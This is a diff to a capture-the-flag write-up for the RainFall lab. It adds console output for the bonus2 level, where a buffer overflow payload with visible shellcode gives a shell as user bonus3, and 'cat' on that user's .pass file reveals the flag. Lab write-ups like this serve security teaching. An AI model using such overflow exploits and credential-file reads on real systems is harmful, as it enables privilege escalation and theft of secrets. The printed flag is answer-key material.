@@ -891,6 +891,15 @@ ARGV2 := filler ((76 - 40 - 13) = 23 bytes) + 0xbffff670 (address of argv[1], 4 
 
 This gives us a shell, which we can use to retrieve the flag.
 
+```console
+bonus2@RainFall:~$ bash /tmp/bonus2.sh
+Goedemiddag! 1�P
+                h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
 
 ## bonus3
 
